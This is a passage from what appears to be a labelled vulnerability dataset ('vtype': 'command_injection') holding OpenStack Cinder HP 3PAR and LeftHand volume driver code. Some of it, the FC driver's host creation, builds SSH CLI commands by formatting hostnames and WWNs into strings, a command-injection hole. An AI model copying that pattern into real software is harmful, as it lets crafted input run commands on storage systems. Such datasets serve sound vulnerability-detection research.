self.common.check_flags(self.configuration, required_flags)\n\n    @utils.synchronized('3par', external=True)\n    def get_volume_stats(self, refresh):\n        self.common.client_login()\n        stats = self.common.get_volume_stats(refresh)\n        stats['storage_protocol'] = 'iSCSI'\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        stats['volume_backend_name'] = backend_name or self.__class__.__name__\n        self.common.client_logout()\n        return stats\n\n    def do_setup(self, context):\n        self.common = self._init_common()\n        self._check_flags()\n\n        # map iscsi_ip-> ip_port\n        #             -> iqn\n        #             -> nsp\n        self.iscsi_ips = {}\n        temp_iscsi_ip = {}\n\n        # use the 3PAR ip_addr list for iSCSI configuration\n        if len(self.configuration.hp3par_iscsi_ips) > 0:\n            # add port values to ip_addr, if necessary\n            for ip_addr in self.configuration.hp3par_iscsi_ips:\n                ip = ip_addr.split(':')\n                if len(ip) == 1:\n                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}\n                elif len(ip) == 2:\n                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}\n                else:\n                    msg = _(\"Invalid IP address format '%s'\") % ip_addr\n                    LOG.warn(msg)\n\n        # add the single value iscsi_ip_address option to the IP dictionary.\n        # This way we can see if it's a valid iSCSI IP. If it's not valid,\n        # we won't use it and won't bother to report it, see below\n        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):\n            ip = self.configuration.iscsi_ip_address\n            ip_port = self.configuration.iscsi_port\n            temp_iscsi_ip[ip] = {'ip_port': ip_port}\n\n        # get all the valid iSCSI ports from 3PAR\n        # when found, add the valid iSCSI ip, ip port, iqn and nsp\n        # to the iSCSI IP dictionary\n        # ...this will also make sure ssh works.\n        iscsi_ports = self.common.get_ports()['iSCSI']\n        for (ip, iscsi_info) in iscsi_ports.iteritems():\n            if ip in temp_iscsi_ip:\n                ip_port = temp_iscsi_ip[ip]['ip_port']\n                self.iscsi_ips[ip] = {'ip_port': ip_port,\n                                      'nsp': iscsi_info['nsp'],\n                                      'iqn': iscsi_info['iqn']\n                                      }\n                del temp_iscsi_ip[ip]\n\n        # if the single value iscsi_ip_address option is still in the\n        # temp dictionary it's because it defaults to $my_ip which doesn't\n        # make sense in this context. So, if present, remove it and move on.\n        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):\n            del temp_iscsi_ip[self.configuration.iscsi_ip_address]\n\n        # lets see if there are invalid iSCSI IPs left in the temp dict\n        if len(temp_iscsi_ip) > 0:\n            msg = _(\"Found invalid iSCSI IP address(s) in configuration \"\n                    \"option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'\") % \\\n                   (\", \".join(temp_iscsi_ip))\n            LOG.warn(msg)\n\n        if not len(self.iscsi_ips) > 0:\n            msg = _('At least one valid iSCSI IP address must be set.')\n            raise exception.InvalidInput(reason=(msg))\n\n        self.common.do_setup(context)\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        self._check_flags()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume(self, volume):\n        self.common.client_login()\n        metadata = self.common.create_volume(volume)\n        self.common.client_logout()\n\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_cloned_volume(self, volume, src_vref):\n        \"\"\"Clone an existing volume.\"\"\"\n        self.common.client_login()\n        new_vol = self.common.create_cloned_volume(volume, src_vref)\n        self.common.client_logout()\n\n        return {'metadata': new_vol}\n\n    @utils.synchronized('3par', external=True)\n    def delete_volume(self, volume):\n        self.common.client_login()\n        self.common.delete_volume(volume)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"\n        Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        self.common.client_login()\n        metadata = self.common.create_volume_from_snapshot(volume, snapshot)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.create_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def delete_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.delete_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host.\n\n        This driver returns a driver_volume_type of 'iscsi'.\n        The format of the driver data is defined in _get_iscsi_properties.\n        Example return value:\n\n            {\n                'driver_volume_type': 'iscsi'\n                'data': {\n                    'target_discovered': True,\n                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',\n                    'target_protal': '127.0.0.1:3260',\n                    'volume_id': 1,\n                }\n            }\n\n        Steps to export a volume on 3PAR\n          * Get the 3PAR iSCSI iqn\n          * Create a host on the 3par\n          * create vlun on the 3par\n        \"\"\"\n        self.common.client_login()\n\n        # we have to make sure we have a host\n        host = self._create_host(volume, connector)\n\n        # now that we have a host, create the VLUN\n        vlun = self.common.create_vlun(volume, host)\n\n        self.common.client_logout()\n\n        iscsi_ip = self._get_iscsi_ip(host['name'])\n        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']\n        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']\n        info = {'driver_volume_type': 'iscsi',\n                'data': {'target_portal': \"%s:%s\" %\n                         (iscsi_ip, iscsi_ip_port),\n                         'target_iqn': iscsi_target_iqn,\n                         'target_lun': vlun['lun'],\n                         'target_discovered': True\n                         }\n                }\n        return info\n\n    @utils.synchronized('3par', external=True)\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        self.common.client_login()\n        self.common.terminate_connection(volume,\n                                         connector['host'],\n                                         connector['initiator'])\n        self.common.client_logout()\n\n    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):\n        \"\"\"Create a 3PAR host.\n\n        Create a 3PAR host, if there is already a host on the 3par using\n        the same iqn but with a different hostname, return the hostname\n        used by 3PAR.\n        \"\"\"\n        cmd = ['createhost', '-iscsi', '-persona', persona_id, '-domain',\n               domain, hostname, iscsi_iqn]\n        out = self.common._cli_run(cmd)\n        if out and len(out) > 1:\n            return self.common.parse_create_host_error(hostname, out)\n        return hostname\n\n    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):\n        # when using -add, you can not send the persona or domain options\n        command = ['createhost', '-iscsi', '-add', hostname, iscsi_iqn]\n        self.common._cli_run(command)\n\n    def _create_host(self, volume, connector):\n        \"\"\"Creates or modifies existing 3PAR host.\"\"\"\n        # make sure we don't have the host already\n        host = None\n        hostname = self.common._safe_hostname(connector['host'])\n        cpg = self.common.get_cpg(volume, allowSnap=True)\n        domain = self.common.get_domain(cpg)\n        try:\n            host = self.common._get_3par_host(hostname)\n            if not host['iSCSIPaths']:\n                self._modify_3par_iscsi_host(hostname, connector['initiator'])\n                host = self.common._get_3par_host(hostname)\n        except hpexceptions.HTTPNotFound:\n            # get persona from the volume type extra specs\n            persona_id = self.common.get_persona_type(volume)\n            # host doesn't exist, we have to create it\n            hostname = self._create_3par_iscsi_host(hostname,\n                                                    connector['initiator'],\n                                                    domain,\n                                                    persona_id)\n            host = self.common._get_3par_host(hostname)\n\n        return host\n\n    @utils.synchronized('3par', external=True)\n    def create_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def ensure_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def remove_export(self, context, volume):\n        pass\n\n    def _get_iscsi_ip(self, hostname):\n        \"\"\"Get an iSCSI IP address to use.\n\n        Steps to determine which IP address to use.\n          * If only one IP address, return it\n          * If there is an active vlun, return the IP associated with it\n          * Return IP with fewest active vluns\n        \"\"\"\n        if len(self.iscsi_ips) == 1:\n            return self.iscsi_ips.keys()[0]\n\n        # if we currently have an active port, use it\n        nsp = self._get_active_nsp(hostname)\n\n        if nsp is None:\n            # no active vlun, find least busy port\n            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())\n            if nsp is None:\n                msg = _(\"Least busy iSCSI port not found, \"\n                        \"using first iSCSI port in list.\")\n                LOG.warn(msg)\n                return self.iscsi_ips.keys()[0]\n\n        return self._get_ip_using_nsp(nsp)\n\n    def _get_iscsi_nsps(self):\n        \"\"\"Return the list of candidate nsps.\"\"\"\n        nsps = []\n        for value in self.iscsi_ips.values():\n            nsps.append(value['nsp'])\n        return nsps\n\n    def _get_ip_using_nsp(self, nsp):\n        \"\"\"Return IP assiciated with given nsp.\"\"\"\n        for (key, value) in self.iscsi_ips.items():\n            if value['nsp'] == nsp:\n                return key\n\n    def _get_active_nsp(self, hostname):\n        \"\"\"Return the active nsp, if one exists, for the given host.\"\"\"\n        result = self.common._cli_run(['showvlun', '-a', '-host', hostname])\n        if result:\n            # first line is header\n            result = result[1:]\n            for line in result:\n                info = line.split(\",\")\n                if info and len(info) > 4:\n                    return info[4]\n\n    def _get_least_used_nsp(self, nspss):\n        \"\"\"\"Return the nsp that has the fewest active vluns.\"\"\"\n        # return only the nsp (node:server:port)\n        result = self.common._cli_run(['showvlun', '-a', '-showcols', 'Port'])\n\n        # count the number of nsps (there is 1 for each active vlun)\n        nsp_counts = {}\n        for nsp in nspss:\n            # initialize counts to zero\n            nsp_counts[nsp] = 0\n\n        current_least_used_nsp = None\n        if result:\n            # first line is header\n            result = result[1:]\n            for line in result:\n                nsp = line.strip()\n                if nsp in nsp_counts:\n                    nsp_counts[nsp] = nsp_counts[nsp] + 1\n\n            # identify key (nsp) of least used nsp\n            current_smallest_count = sys.maxint\n            for (nsp, count) in nsp_counts.iteritems():\n                if count < current_smallest_count:\n                    current_least_used_nsp = nsp\n                    current_smallest_count = count\n\n        return current_least_used_nsp\n\n    def extend_volume(self, volume, new_size):\n        self.common.extend_volume(volume, new_size)\n/n/n/ncinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nHP Lefthand SAN ISCSI Driver.\n\nThe driver communicates to the backend aka Cliq via SSH to perform all the\noperations on the SAN.\n\"\"\"\nfrom lxml import etree\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder.volume.drivers.san.san import SanISCSIDriver\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HpSanISCSIDriver(SanISCSIDriver):\n    \"\"\"Executes commands relating to HP/Lefthand SAN ISCSI volumes.\n\n    We use the CLIQ interface, over SSH.\n\n    Rough overview of CLIQ commands used:\n\n    :createVolume:    (creates the volume)\n\n    :getVolumeInfo:    (to discover the IQN etc)\n\n    :getClusterInfo:    (to discover the iSCSI target IP address)\n\n    :assignVolumeChap:    (exports it with CHAP security)\n\n    The 'trick' here is that the HP SAN enforces security by default, so\n    normally a volume mount would need both to configure the SAN in the volume\n    layer and do the mount on the compute layer.  Multi-layer operations are\n    not catered for at the moment in the cinder architecture, so instead we\n    share the volume using CHAP at volume creation time.  Then the mount need\n    only use those CHAP credentials, so can take place exclusively in the\n    compute layer.\n    \"\"\"\n\n    device_stats = {}\n\n    def __init__(self, *args, **kwargs):\n        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)\n        self.cluster_vip = None\n\n    def _cliq_run(self, verb, cliq_args, check_exit_code=True):\n        \"\"\"Runs a CLIQ command over SSH, without doing any result parsing\"\"\"\n        cmd_list = [verb]\n        for k, v in cliq_args.items():\n            cmd_list.append(\"%s=%s\" % (k, v))\n\n        return self._run_ssh(cmd_list, check_exit_code)\n\n    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):\n        \"\"\"Runs a CLIQ command over SSH, parsing and checking the output\"\"\"\n        cliq_args['output'] = 'XML'\n        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)\n\n        LOG.debug(_(\"CLIQ command returned %s\"), out)\n\n        result_xml = etree.fromstring(out)\n        if check_cliq_result:\n            response_node = result_xml.find(\"response\")\n            if response_node is None:\n                msg = (_(\"Malformed response to CLIQ command \"\n                         \"%(verb)s %(cliq_args)s. Result=%(out)s\") %\n                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})\n                raise exception.VolumeBackendAPIException(data=msg)\n\n            result_code = response_node.attrib.get(\"result\")\n\n            if result_code != \"0\":\n                msg = (_(\"Error running CLIQ command %(verb)s %(cliq_args)s. \"\n                         \" Result=%(out)s\") %\n                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})\n                raise exception.VolumeBackendAPIException(data=msg)\n\n        return result_xml\n\n    def _cliq_get_cluster_info(self, cluster_name):\n        \"\"\"Queries for info about the cluster (including IP)\"\"\"\n        cliq_args = {}\n        cliq_args['clusterName'] = cluster_name\n        cliq_args['searchDepth'] = '1'\n        cliq_args['verbose'] = '0'\n\n        result_xml = self._cliq_run_xml(\"getClusterInfo\", cliq_args)\n\n        return result_xml\n\n    def _cliq_get_cluster_vip(self, cluster_name):\n        \"\"\"Gets the IP on which a cluster shares iSCSI volumes\"\"\"\n        cluster_xml = self._cliq_get_cluster_info(cluster_name)\n\n        vips = []\n        for vip in cluster_xml.findall(\"response/cluster/vip\"):\n            vips.append(vip.attrib.get('ipAddress'))\n\n        if len(vips) == 1:\n            return vips[0]\n\n        _xml = etree.tostring(cluster_xml)\n        msg = (_(\"Unexpected number of virtual ips for cluster \"\n                 \" %(cluster_name)s. Result=%(_xml)s\") %\n               {'cluster_name': cluster_name, '_xml': _xml})\n        raise exception.VolumeBackendAPIException(data=msg)\n\n    def _cliq_get_volume_info(self, volume_name):\n        \"\"\"Gets the volume info, including IQN\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume_name\n        result_xml = self._cliq_run_xml(\"getVolumeInfo\", cliq_args)\n\n        # Result looks like this:\n        #<gauche version=\"1.0\">\n        #  <response description=\"Operation succeeded.\" name=\"CliqSuccess\"\n        #            processingTime=\"87\" result=\"0\">\n        #    <volume autogrowPages=\"4\" availability=\"online\" blockSize=\"1024\"\n        #       bytesWritten=\"0\" checkSum=\"false\" clusterName=\"Cluster01\"\n        #       created=\"2011-02-08T19:56:53Z\" deleting=\"false\" description=\"\"\n        #       groupName=\"Group01\" initialQuota=\"536870912\" isPrimary=\"true\"\n        #       iscsiIqn=\"iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b\"\n        #       maxSize=\"6865387257856\" md5=\"9fa5c8b2cca54b2948a63d833097e1ca\"\n        #       minReplication=\"1\" name=\"vol-b\" parity=\"0\" replication=\"2\"\n        #       reserveQuota=\"536870912\" scratchQuota=\"4194304\"\n        #       serialNumber=\"9fa5c8b2cca54b2948a63d833097e1ca0000000000006316\"\n        #       size=\"1073741824\" stridePages=\"32\" thinProvision=\"true\">\n        #      <status description=\"OK\" value=\"2\"/>\n        #      <permission access=\"rw\"\n        #            authGroup=\"api-34281B815713B78-(trimmed)51ADD4B7030853AA7\"\n        #            chapName=\"chapusername\" chapRequired=\"true\" id=\"25369\"\n        #            initiatorSecret=\"\" iqn=\"\" iscsiEnabled=\"true\"\n        #            loadBalance=\"true\" targetSecret=\"supersecret\"/>\n        #    </volume>\n        #  </response>\n        #</gauche>\n\n        # Flatten the nodes into a dictionary; use prefixes to avoid collisions\n        volume_attributes = {}\n\n        volume_node = result_xml.find(\"response/volume\")\n        for k, v in volume_node.attrib.items():\n            volume_attributes[\"volume.\" + k] = v\n\n        status_node = volume_node.find(\"status\")\n        if status_node is not None:\n            for k, v in status_node.attrib.items():\n                volume_attributes[\"status.\" + k] = v\n\n        # We only consider the first permission node\n        permission_node = volume_node.find(\"permission\")\n        if permission_node is not None:\n            for k, v in status_node.attrib.items():\n                volume_attributes[\"permission.\" + k] = v\n\n        LOG.debug(_(\"Volume info: %(volume_name)s => %(volume_attributes)s\") %\n                  {'volume_name': volume_name,\n                   'volume_attributes': volume_attributes})\n        return volume_attributes\n\n    def create_volume(self, volume):\n        \"\"\"Creates a volume.\"\"\"\n        cliq_args = {}\n        cliq_args['clusterName'] = self.configuration.san_clustername\n\n        if self.configuration.san_thin_provision:\n            cliq_args['thinProvision'] = '1'\n        else:\n            cliq_args['thinProvision'] = '0'\n\n        cliq_args['volumeName'] = volume['name']\n        if int(volume['size']) == 0:\n            cliq_args['size'] = '100MB'\n        else:\n            cliq_args['size'] = '%sGB' % volume['size']\n\n        self._cliq_run_xml(\"createVolume\", cliq_args)\n\n        volume_info = self._cliq_get_volume_info(volume['name'])\n        cluster_name = volume_info['volume.clusterName']\n        iscsi_iqn = volume_info['volume.iscsiIqn']\n\n        #TODO(justinsb): Is this always 1? Does it matter?\n        cluster_interface = '1'\n\n        if not self.cluster_vip:\n            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)\n        iscsi_portal = self.cluster_vip + \":3260,\" + cluster_interface\n\n        model_update = {}\n\n        # NOTE(jdg): LH volumes always at lun 0 ?\n        model_update['provider_location'] = (\"%s %s %s\" %\n                                             (iscsi_portal,\n                                              iscsi_iqn,\n                                              0))\n\n        return model_update\n\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"Creates a volume from a snapshot.\"\"\"\n        raise NotImplementedError()\n\n    def create_snapshot(self, snapshot):\n        \"\"\"Creates a snapshot.\"\"\"\n        raise NotImplementedError()\n\n    def delete_volume(self, volume):\n        \"\"\"Deletes a volume.\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['prompt'] = 'false'  # Don't confirm\n        try:\n            volume_info = self._cliq_get_volume_info(volume['name'])\n        except exception.ProcessExecutionError:\n            LOG.error(\"Volume did not exist. It will not be deleted\")\n            return\n        self._cliq_run_xml(\"deleteVolume\", cliq_args)\n\n    def local_path(self, volume):\n        msg = _(\"local_path not supported\")\n        raise exception.VolumeBackendAPIException(data=msg)\n\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host. HP VSA requires a volume to be assigned\n        to a server.\n\n        This driver returns a driver_volume_type of 'iscsi'.\n        The format of the driver data is defined in _get_iscsi_properties.\n        Example return value:\n\n            {\n                'driver_volume_type': 'iscsi'\n                'data': {\n                    'target_discovered': True,\n                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',\n                    'target_protal': '127.0.0.1:3260',\n                    'volume_id': 1,\n                }\n            }\n\n        \"\"\"\n        self._create_server(connector)\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['serverName'] = connector['host']\n        self._cliq_run_xml(\"assignVolumeToServer\", cliq_args)\n\n        iscsi_properties = self._get_iscsi_properties(volume)\n        return {\n            'driver_volume_type': 'iscsi',\n            'data': iscsi_properties\n        }\n\n    def _create_server(self, connector):\n        cliq_args = {}\n        cliq_args['serverName'] = connector['host']\n        out = self._cliq_run_xml(\"getServerInfo\", cliq_args, False)\n        response = out.find(\"response\")\n        result = response.attrib.get(\"result\")\n        if result != '0':\n            cliq_args = {}\n            cliq_args['serverName'] = connector['host']\n            cliq_args['initiator'] = connector['initiator']\n            self._cliq_run_xml(\"createServer\", cliq_args)\n\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Unassign the volume from the host.\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['serverName'] = connector['host']\n        self._cliq_run_xml(\"unassignVolumeToServer\", cliq_args)\n\n    def get_volume_stats(self, refresh):\n        if refresh:\n            self._update_backend_status()\n\n        return self.device_stats\n\n    def _update_backend_status(self):\n        data = {}\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        data['volume_backend_name'] = backend_name or self.__class__.__name__\n        data['driver_version'] = '1.0'\n        data['reserved_percentage'] = 0\n        data['storage_protocol'] = 'iSCSI'\n        data['vendor_name'] = 'Hewlett-Packard'\n\n        result_xml = self._cliq_run_xml(\"getClusterInfo\", {})\n        cluster_node = result_xml.find(\"response/cluster\")\n        total_capacity = cluster_node.attrib.get(\"spaceTotal\")\n        free_capacity = cluster_node.attrib.get(\"unprovisionedSpace\")\n        GB = 1073741824\n\n        data['total_capacity_gb'] = int(total_capacity) / GB\n        data['free_capacity_gb'] = int(free_capacity) / GB\n        self.device_stats = data\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "c55589b131828f3a595903f6796cb2d0babb772f", "code": "/cinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver for HP 3PAR Storage array.\nThis driver requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nSet the following in the cinder.conf file to enable the\n3PAR Fibre Channel Driver along with the required flags:\n\nvolume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver\n\"\"\"\n\nfrom hp3parclient import exceptions as hpexceptions\nfrom oslo.config import cfg\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nimport cinder.volume.driver\nfrom cinder.volume.drivers.san.hp import hp_3par_common as hpcommon\nfrom cinder.volume.drivers.san import san\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\n\n\nclass HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):\n    \"\"\"OpenStack Fibre Channel driver to enable 3PAR storage array.\n\n    Version history:\n        1.0 - Initial driver\n        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,\n              session changes, faster clone, requires 3.1.2 MU2 firmware,\n              copy volume <--> Image.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(HP3PARFCDriver, self).__init__(*args, **kwargs)\n        self.common = None\n        self.configuration.append_config_values(hpcommon.hp3par_opts)\n        self.configuration.append_config_values(san.san_opts)\n\n    def _init_common(self):\n        return hpcommon.HP3PARCommon(self.configuration)\n\n    def _check_flags(self):\n        \"\"\"Sanity check to ensure we have required options set.\"\"\"\n        required_flags = ['hp3par_api_url', 'hp3par_username',\n                          'hp3par_password',\n                          'san_ip', 'san_login', 'san_password']\n        self.common.check_flags(self.configuration, required_flags)\n\n    @utils.synchronized('3par', external=True)\n    def get_volume_stats(self, refresh):\n        self.common.client_login()\n        stats = self.common.get_volume_stats(refresh)\n        stats['storage_protocol'] = 'FC'\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        stats['volume_backend_name'] = backend_name or self.__class__.__name__\n        self.common.client_logout()\n        return stats\n\n    def do_setup(self, context):\n        self.common = self._init_common()\n        self._check_flags()\n        self.common.do_setup(context)\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        self._check_flags()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume(self, volume):\n        self.common.client_login()\n        metadata = self.common.create_volume(volume)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_cloned_volume(self, volume, src_vref):\n        self.common.client_login()\n        new_vol = self.common.create_cloned_volume(volume, src_vref)\n        self.common.client_logout()\n        return {'metadata': new_vol}\n\n    @utils.synchronized('3par', external=True)\n    def delete_volume(self, volume):\n        self.common.client_login()\n        self.common.delete_volume(volume)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"\n        Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        self.common.client_login()\n        metadata = self.common.create_volume_from_snapshot(volume, snapshot)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.create_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def delete_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.delete_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host.\n\n        The  driver returns a driver_volume_type of 'fibre_channel'.\n        The target_wwn can be a single entry or a list of wwns that\n        correspond to the list of remote wwn(s) that will export the volume.\n        Example return values:\n\n            {\n                'driver_volume_type': 'fibre_channel'\n                'data': {\n                    'target_discovered': True,\n                    'target_lun': 1,\n                    'target_wwn': '1234567890123',\n                }\n            }\n\n            or\n\n             {\n                'driver_volume_type': 'fibre_channel'\n                'data': {\n                    'target_discovered': True,\n                    'target_lun': 1,\n                    'target_wwn': ['1234567890123', '0987654321321'],\n                }\n            }\n\n\n        Steps to export a volume on 3PAR\n          * Create a host on the 3par with the target wwn\n          * Create a VLUN for that HOST with the volume we want to export.\n\n        \"\"\"\n        self.common.client_login()\n        # we have to make sure we have a host\n        host = self._create_host(volume, connector)\n\n        # now that we have a host, create the VLUN\n        vlun = self.common.create_vlun(volume, host)\n\n        ports = self.common.get_ports()\n\n        self.common.client_logout()\n        info = {'driver_volume_type': 'fibre_channel',\n                'data': {'target_lun': vlun['lun'],\n                         'target_discovered': True,\n                         'target_wwn': ports['FC']}}\n        return info\n\n    @utils.synchronized('3par', external=True)\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        self.common.client_login()\n        self.common.terminate_connection(volume,\n                                         connector['host'],\n                                         connector['wwpns'])\n        self.common.client_logout()\n\n    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):\n        \"\"\"Create a 3PAR host.\n\n        Create a 3PAR host, if there is already a host on the 3par using\n        the same wwn but with a different hostname, return the hostname\n        used by 3PAR.\n        \"\"\"\n        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'\n                                   % (persona_id, domain,\n                                      hostname, \" \".join(wwn)), None)\n        if out and len(out) > 1:\n            return self.common.parse_create_host_error(hostname, out)\n\n        return hostname\n\n    def _modify_3par_fibrechan_host(self, hostname, wwn):\n        # when using -add, you can not send the persona or domain options\n        out = self.common._cli_run('createhost -add %s %s'\n                                   % (hostname, \" \".join(wwn)), None)\n\n    def _create_host(self, volume, connector):\n        \"\"\"Creates or modifies existing 3PAR host.\"\"\"\n        host = None\n        hostname = self.common._safe_hostname(connector['host'])\n        cpg = self.common.get_cpg(volume, allowSnap=True)\n        domain = self.common.get_domain(cpg)\n        try:\n            host = self.common._get_3par_host(hostname)\n            if not host['FCPaths']:\n                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])\n                host = self.common._get_3par_host(hostname)\n        except hpexceptions.HTTPNotFound as ex:\n            # get persona from the volume type extra specs\n            persona_id = self.common.get_persona_type(volume)\n            # host doesn't exist, we have to create it\n            hostname = self._create_3par_fibrechan_host(hostname,\n                                                        connector['wwpns'],\n                                                        domain,\n                                                        persona_id)\n            host = self.common._get_3par_host(hostname)\n\n        return host\n\n    @utils.synchronized('3par', external=True)\n    def create_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def ensure_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def remove_export(self, context, volume):\n        pass\n\n    def extend_volume(self, volume, new_size):\n        self.common.extend_volume(volume, new_size)\n/n/n/n/cinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver for HP 3PAR Storage array.\nThis driver requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nSet the following in the cinder.conf file to enable the\n3PAR iSCSI Driver along with the required flags:\n\nvolume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver\n\"\"\"\n\nimport sys\n\nfrom hp3parclient import exceptions as hpexceptions\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nimport cinder.volume.driver\nfrom cinder.volume.drivers.san.hp import hp_3par_common as hpcommon\nfrom cinder.volume.drivers.san import san\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\nDEFAULT_ISCSI_PORT = 3260\n\n\nclass HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):\n    